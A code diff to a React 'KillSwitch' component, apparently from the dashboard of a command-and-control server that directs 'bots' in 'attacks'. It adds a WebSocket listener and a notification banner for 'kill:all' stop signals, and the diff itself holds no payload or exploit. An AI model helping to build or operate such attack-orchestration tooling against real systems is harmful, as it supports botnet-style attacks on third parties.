@@ -1,8 +1,9 @@
 'use client';
 
-import { useState } from 'react';
-import { motion } from 'framer-motion';
+import { useState, useCallback } from 'react';
+import { motion, AnimatePresence } from 'framer-motion';
 import { Card, CardContent } from '@/components/ui';
+import { useKillSignal } from '@/hooks/useWebSocket';
 
 interface KillSwitchProps {
   isAttacking: boolean;
@@ -12,6 +13,28 @@ interface KillSwitchProps {
 export default function KillSwitch({ isAttacking, onKillSwitch }: KillSwitchProps) {
   const [isLoading, setIsLoading] = useState(false);
   const [lastTriggered, setLastTriggered] = useState<Date | null>(null);
+  const [killNotification, setKillNotification] = useState<string | null>(null);
+
+  // Listen for real-time "kill:all" WebSocket messages broadcast by the CNC
+  // server when POST /api/attack/stop is called (by any operator, not just this
+  // browser session). Updates isAttacking state and shows a notification banner.
+  const handleKillSignal = useCallback((data: any) => {
+    const stopped: number = data?.stopped ?? 0;
+    const ts: string = data?.timestamp
+      ? new Date(data.timestamp).toLocaleTimeString()
+      : new Date().toLocaleTimeString();
+
+    setLastTriggered(new Date());
+    setKillNotification(
+      `Kill signal received at ${ts} — ${stopped} attack${stopped !== 1 ? 's' : ''} stopped`
+    );
+    onKillSwitch?.();
+
+    // Auto-dismiss notification after 8 seconds
+    setTimeout(() => setKillNotification(null), 8000);
+  }, [onKillSwitch]);
+
+  useKillSignal(handleKillSignal);
 
   const handleKillSwitch = async () => {
     const confirmed = window.confirm('Send kill switch signal to ALL bots?');
@@ -30,6 +53,8 @@ export default function KillSwitch({ isAttacking, onKillSwitch }: KillSwitchProp
       if (response.ok) {
         setLastTriggered(new Date());
         onKillSwitch?.();
+        // Note: the CNC will also broadcast kill:all via WebSocket —
+        // handleKillSignal will fire and show the notification automatically.
       } else {
         console.error('Kill switch failed:', response.statusText);
       }
@@ -43,6 +68,22 @@ export default function KillSwitch({ isAttacking, onKillSwitch }: KillSwitchProp
   return (
     <Card variant="elevated" className="border-2 border-accent-danger/30 overflow-hidden">
       <CardContent className="p-8">
+        {/* Real-time kill signal notification banner */}
+        <AnimatePresence>
+          {killNotification && (
+            <motion.div
+              initial={{ opacity: 0, y: -8 }}
+              animate={{ opacity: 1, y: 0 }}
+              exit={{ opacity: 0, y: -8 }}
+              transition={{ duration: 0.25 }}
+              className="mb-6 p-3 rounded-lg bg-accent-danger/10 border border-accent-danger/40 text-accent-danger text-sm font-mono flex items-center gap-2"
+            >
+              <span className="text-base">🛑</span>
+              {killNotification}
+            </motion.div>
+          )}
+        </AnimatePresence>
+
         <div className="flex items-center justify-between">
           <div className="flex-1">
             <div className="flex items-center space-x-3 mb-4">
